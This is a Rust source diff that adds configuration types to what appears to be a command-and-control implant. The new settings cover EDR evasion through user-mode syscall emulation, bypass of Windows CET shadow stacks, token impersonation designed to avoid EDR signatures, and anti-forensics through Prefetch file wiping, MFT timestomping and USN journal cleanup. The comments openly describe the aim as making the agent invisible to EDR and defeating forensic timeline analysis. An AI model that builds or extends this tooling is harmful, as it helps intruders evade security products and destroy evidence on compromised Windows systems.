@@ -512,6 +512,321 @@ impl Default for DelayedStompConfig {
     }
 }
 
+// ── SyscallEmulationConfig ────────────────────────────────────────────────
+
+/// Configuration for user-mode NT kernel interface emulation.
+///
+/// Implements frequently-used NT syscalls ENTIRELY in user-mode Rust code via
+/// kernel32/advapi32 fallbacks, eliminating ALL references to ntdll.dll syscall
+/// stubs.  This makes the agent invisible to EDR hooks on ntdll AND to ntdll
+/// unhooking detection.  When the kernel32 fallback is unavailable or fails,
+/// the existing indirect syscall path in `syscalls.rs` is used as a fallback.
+///
+/// Call stack consistency: when using kernel32 fallbacks, the call stack shows
+/// `kernel32!WriteProcessMemory` etc. — BENEFICIAL as it looks like legitimate
+/// API usage.
+///
+/// Only effective when compiled with the `syscall-emulation` feature
+/// (which implies `direct-syscalls`).  Windows-only.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct SyscallEmulationConfig {
+    /// Enable user-mode syscall emulation globally.  When `false`, all
+    /// calls go through the existing indirect syscall path.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Prefer kernel32/advapi32 equivalents over indirect syscalls.
+    /// When `true`, the emulation layer is tried first for all configured
+    /// functions.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_kernel32: bool,
+    /// Fall back to the existing indirect syscall path when the kernel32
+    /// equivalent fails.  When `false`, a kernel32 failure is propagated
+    /// immediately without attempting indirect syscalls.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub fallback_to_indirect: bool,
+    /// List of Nt function names to emulate via kernel32 fallbacks.
+    /// Only these functions will be routed through the emulation layer;
+    /// all others go through the existing indirect syscall path unchanged.
+    /// Default: six most commonly used functions for injection and memory ops.
+    #[serde(default = "default_emulated_functions")]
+    pub emulated_functions: Vec<String>,
+}
+
+fn default_emulated_functions() -> Vec<String> {
+    vec![
+        "NtWriteVirtualMemory".into(),
+        "NtReadVirtualMemory".into(),
+        "NtAllocateVirtualMemory".into(),
+        "NtProtectVirtualMemory".into(),
+        "NtOpenProcess".into(),
+        "NtClose".into(),
+    ]
+}
+
+impl Default for SyscallEmulationConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            prefer_kernel32: true,
+            fallback_to_indirect: true,
+            emulated_functions: default_emulated_functions(),
+        }
+    }
+}
+
+// ── CetBypassConfig ──────────────────────────────────────────────────────
+
+/// Configuration for CET (Control-flow Enforcement Technology) / Shadow
+/// Stack bypass.
+///
+/// Windows 11 24H2+ enables kernel-mode hardware-enforced shadow stacks by
+/// default.  CET maintains a separate "shadow stack" that records return
+/// addresses — if a `ret` instruction's target doesn't match the shadow
+/// stack entry, a #CP (Control Protection) exception fires.  This defeats
+/// ROP, stack pivoting, and return-address spoofing.
+///
+/// Three bypass strategies are available:
+///
+/// 1. **Policy disable** (preferred): Use `NtSetInformationProcess` with
+///    `ProcessMitigationPolicy` to disable CET shadow stacks for the target
+///    process (and the agent itself, if needed).
+///
+/// 2. **CET-compatible call chain**: Build legitimate call chains through
+///    ntdll/kernel32 functions so each `call` pushes a valid entry onto both
+///    the regular and shadow stacks.  Used when CET cannot be disabled via
+///    policy (insufficient privileges).
+///
+/// 3. **VEH shadow stack fix** (experimental): Register a VEH handler that
+///    intercepts #CP exceptions and adjusts the shadow stack entry.  Requires
+///    kernel access (BYOVD) to read/write KTHREAD shadow stack pointer.
+///
+/// Only effective when compiled with the `cet-bypass` feature (which implies
+/// `direct-syscalls`).  Windows-only.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct CetBypassConfig {
+    /// Enable CET/shadow-stack bypass globally.  When `false`, all call-stack
+    /// spoofing proceeds without CET awareness (will crash if CET is active).
+    /// Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Prefer disabling CET via process mitigation policy before attempting
+    /// operations that manipulate return addresses.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_policy_disable: bool,
+    /// Fall back to the CET-compatible call-chain approach when CET cannot be
+    /// disabled via policy (e.g. insufficient privileges).  When `false` and
+    /// policy disable fails, the operation is aborted.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub fallback_to_call_chain: bool,
+    /// Enable the experimental VEH-based shadow stack fix.  Requires kernel
+    /// access (BYOVD via `kernel-callback` feature) to manipulate KTHREAD
+    /// shadow stack pointers.  Default: `false` (too risky without kernel).
+    #[serde(default)]
+    pub veh_shadow_fix: bool,
+}
+
+impl Default for CetBypassConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            prefer_policy_disable: true,
+            fallback_to_call_chain: true,
+            veh_shadow_fix: false,
+        }
+    }
+}
+
+// ── TokenImpersonationConfig ─────────────────────────────────────────────
+
+/// Configuration for token-only impersonation via NtImpersonateThread /
+/// SetThreadToken.  Avoids calling `ImpersonateNamedPipeClient` directly on
+/// the main agent thread, which is heavily signatured by EDR products.
+///
+/// Two bypass strategies are available:
+///
+/// 1. **Impersonation thread**: Create a helper thread that calls
+///    `ConnectNamedPipe` + `ImpersonateNamedPipeClient`, then extract the
+///    impersonation token via `NtOpenThreadToken` and apply it to the main
+///    thread via `NtSetInformationThread(ThreadImpersonationToken)`.  The
+///    main thread never calls any impersonation API — EDR monitoring sees
+///    only `NtSetInformationThread` (a lower-level NT API).
+///
+/// 2. **SetThreadToken**: Use `DuplicateTokenEx` on the connected client's
+///    token, then call `SetThreadToken(NULL, duplicated_token)` on the
+///    current thread.  This is even more direct — `SetThreadToken` is a
+///    lower-level API that fewer EDR products monitor.
+///
+/// Token cache: Duplicated tokens are stored in an encrypted HashMap keyed
+/// by source (pipe name / PID).  Tokens are automatically reverted when a
+/// task completes (configurable via `auto_revert_on_task_complete`).
+///
+/// Only effective when compiled with the `token-impersonation` feature.
+/// Windows-only.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct TokenImpersonationConfig {
+    /// Enable token-only impersonation globally.  When `false`, any existing
+    /// named pipe impersonation (e.g. `ImpersonateNamedPipeClient`) is used
+    /// unchanged.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Prefer `SetThreadToken` over the impersonation-thread approach.
+    /// `SetThreadToken` is more direct (single API call) but fewer EDRs
+    /// monitor it, making it the preferred strategy.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_set_thread_token: bool,
+    /// Cache duplicated tokens for reuse across multiple operations.  Tokens
+    /// are stored encrypted at rest via `memory_guard`.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub cache_tokens: bool,
+    /// Automatically revert the impersonation token when a C2 task handler
+    /// returns.  When `false`, the token remains active until explicitly
+    /// reverted via `RevertToken` command.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub auto_revert_on_task_complete: bool,
+}
+
+impl Default for TokenImpersonationConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            prefer_set_thread_token: true,
+            cache_tokens: true,
+            auto_revert_on_task_complete: true,
+        }
+    }
+}
+
+// ── PrefetchConfig ────────────────────────────────────────────────────────
+
+/// Cleanup method for Windows Prefetch evidence.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub enum PrefetchCleanMethod {
+    /// Delete the .pf file via NtDeleteFile.
+    Delete,
+    /// Patch the .pf header in-place: zero run count, timestamps, strings.
+    /// Preferred — file remains but contains no useful forensic data.
+    #[default]
+    Patch,
+    /// Disable the Prefetch service before the operation, restore after.
+    DisableService,
+}
+
+/// Configuration for Windows Prefetch evidence removal.
+///
+/// Windows stores .pf files in `C:\Windows\Prefetch\` that record process
+/// execution evidence (executable name, run count, timestamps, loaded DLLs,
+/// directories accessed).  EDR and forensic tools parse these to build
+/// execution timelines.  This subsystem removes or sanitises .pf evidence
+/// after injection or on-demand.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct PrefetchConfig {
+    /// Enable prefetch evidence cleanup.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+
+    /// Automatically clean prefetch evidence after injection completes.
+    #[serde(default = "default_true")]
+    pub auto_clean_after_injection: bool,
+
+    /// Cleanup method: "delete", "patch" (preferred), or "disable-service".
+    #[serde(default)]
+    pub method: PrefetchCleanMethod,
+
+    /// Restore the Prefetch service to its original state after disabling.
+    /// Only applies when method is "disable-service".
+    #[serde(default = "default_true")]
+    pub restore_service_after: bool,
+
+    /// Clean USN journal entries referencing the .pf file after
+    /// modification/deletion to prevent forensic timeline analysis.
+    #[serde(default = "default_true")]
+    pub clean_usn_journal: bool,
+}
+
+impl Default for PrefetchConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            auto_clean_after_injection: true,
+            method: PrefetchCleanMethod::default(),
+            restore_service_after: true,
+            clean_usn_journal: true,
+        }
+    }
+}
+
+// ── TimestampConfig ──────────────────────────────────────────────────────
+
+/// Default reference file for cover timestamps.  `ntdll.dll` is present on
+/// every Windows system and is accessed frequently, making its timestamps
+/// a natural-looking cover.
+fn default_reference_file() -> String {
+    r"C:\Windows\System32\ntdll.dll".to_string()
+}
+
+/// Configuration for MFT timestamp synchronization and USN journal cleanup.
+///
+/// NTFS stores file timestamps in TWO MFT attributes: `$STANDARD_INFORMATION`
+/// ($SI) and `$FILE_NAME` ($FN).  Most forensic tools compare both — if $SI
+/// is modified but $FN isn't (or vice versa), it indicates timestomping.
+/// This subsystem synchronises both attributes plus cleans USN journal
+/// entries to prevent forensic timeline analysis of file operations.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct TimestampConfig {
+    /// Enable timestamp synchronisation and USN journal cleanup.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+
+    /// Synchronise both $SI and $FN timestamps.  If false, only $SI is
+    /// modified (NtSetInformationFile with FileBasicInformation) — simpler
+    /// but detectable by tools that compare $SI vs $FN.
+    #[serde(default = "default_true")]
+    pub sync_si_and_fn: bool,
+
+    /// Clean USN journal entries referencing modified files after
+    /// timestamp manipulation to prevent forensic timeline recovery.
+    #[serde(default = "default_true")]
+    pub usn_cleanup: bool,
+
+    /// Truncate $LogFile entries referencing timestamp changes.
+    /// **Dangerous** — may cause NTFS corruption if the system crashes
+    /// during the operation.  Defaults to false (safe: let entries age
+    /// out naturally from the circular log).
+    #[serde(default)]
+    pub logfile_cleanup: bool,
+
+    /// Path to a reference file whose timestamps will be used as the
+    /// "cover time" for timestomping.  The reference file should be a
+    /// commonly-accessed system file (e.g. `ntdll.dll`, `kernel32.dll`)
+    /// so that the timestamps blend in with normal system activity.
+    #[serde(default = "default_reference_file")]
+    pub reference_file: String,
+
+    /// Automatically clean timestamps after file operations (file drops,
+    /// DLL stomping, config writes) to prevent forensic detection.
+    #[serde(default = "default_true")]
+    pub auto_clean_after_file_ops: bool,
+}
+
+impl Default for TimestampConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            sync_si_and_fn: true,
+            usn_cleanup: true,
+            logfile_cleanup: false,
+            reference_file: default_reference_file(),
+            auto_clean_after_file_ops: true,
+        }
+    }
+}
+
 impl Default for LsaWhispererConfig {
     fn default() -> Self {
         Self {
@@ -1100,6 +1415,44 @@ pub struct Config {
     /// Only effective when compiled with the `delayed-stomp` feature.
     #[serde(default)]
     pub delayed_stomp: DelayedStompConfig,
+
+    /// Configuration for user-mode NT kernel interface emulation.
+    /// Implements frequently-used NT syscalls via kernel32/advapi32 fallbacks,
+    /// eliminating all references to ntdll.dll syscall stubs.  Makes the agent
+    /// invisible to EDR hooks on ntdll AND to ntdll unhooking detection.
+    /// Only effective when compiled with the `syscall-emulation` feature.
+    #[serde(default)]
+    pub syscall_emulation: SyscallEmulationConfig,
+
+    /// Configuration for CET (Control-flow Enforcement Technology) / Shadow
+    /// Stack bypass.  Handles Windows 11 24H2+ hardware-enforced shadow
+    /// stacks that defeat return-address spoofing and stack pivoting.
+    /// Only effective when compiled with the `cet-bypass` feature.
+    #[serde(default)]
+    pub cet_bypass: CetBypassConfig,
+
+    /// Configuration for token-only impersonation via NtImpersonateThread /
+    /// SetThreadToken.  Avoids `ImpersonateNamedPipeClient` on the main
+    /// agent thread, which is heavily signatured by EDR products.
+    /// Only effective when compiled with the `token-impersonation` feature.
+    #[serde(default)]
+    pub token_impersonation: TokenImpersonationConfig,
+
+       /// Configuration for Windows Prefetch evidence removal.  Cleans .pf
+    /// files after injection or on-demand to prevent forensic timeline
+    /// analysis.  Supports delete, patch (preferred), and service-disable
+       /// methods.  Only effective when compiled with the `forensic-cleanup`
+    /// feature.
+    #[serde(default)]
+    pub prefetch: PrefetchConfig,
+
+    /// Configuration for MFT timestamp synchronisation and USN journal
+    /// cleanup.  Synchronises $STANDARD_INFORMATION and $FILE_NAME
+    /// timestamps in the MFT to prevent forensic timeline analysis.
+    /// Optionally cleans USN journal entries and $LogFile references.
+    /// Only effective when compiled with the `forensic-cleanup` feature.
+    #[serde(default)]
+    pub timestamps: TimestampConfig,
 }
 
 /// Per-platform list of persistence mechanisms to install.
@@ -1314,6 +1667,11 @@ impl Default for Config {
             evasion_transform: EvasionTransformConfig::default(),
             transacted_hollowing: TransactedHollowingConfig::default(),
             delayed_stomp: DelayedStompConfig::default(),
+            syscall_emulation: SyscallEmulationConfig::default(),
+            cet_bypass: CetBypassConfig::default(),
+            token_impersonation: TokenImpersonationConfig::default(),
+            prefetch: PrefetchConfig::default(),
+            timestamps: TimestampConfig::default(),
         }
     }
 }
